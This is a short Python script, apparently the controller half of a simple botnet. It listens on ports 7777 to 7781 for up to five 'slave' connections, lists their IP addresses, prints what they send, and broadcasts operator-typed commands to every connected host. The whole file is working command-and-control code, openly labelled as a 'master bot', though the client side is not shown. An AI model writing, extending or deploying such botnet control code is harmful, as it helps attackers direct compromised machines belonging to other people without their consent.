import socket
from threading import Thread
import time

initial_port = 7777
max_bots = 5

threads = []
slaves = []

def listen(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("",port))
    s.listen()
    slave, slave_address = s.accept()
    slaves.append(slave)

def getSlaveMsg(s):
    while True:
        msg=s.recv(1024).decode()
        print("[+] Slave said: ", msg)

def main():
    print("[+] Master bot listening for incoming connections")
    for i in range(max_bots):
        ListenerThread = Thread(target=listen,args=(i+initial_port,), daemon=True)
        threads.append(ListenerThread)
        ListenerThread.start()

    while True:
        if len(slaves)!=0:
            print("[+] Enumerating all slaves.")
            for index, individual_slave in enumerate(slaves):
                print("[i] ", index, ". slave ip: ", individual_slave.getpeername())
                try:
                    Thread(target=getSlaveMsg,args=(individual_slave,),daemon=True).start()
                except:
                    print("[E] Error starting msg reciever thread for master")
            while True:
                msg = input("[+] enter message: ")
                for slave in slaves:
                    slave.send(msg.encode())
                if msg == "exit":
                    break
            if msg == "exit":
                break


if __name__=="__main__":
    try:
        main()
    except:
        print("Exiting")
        exit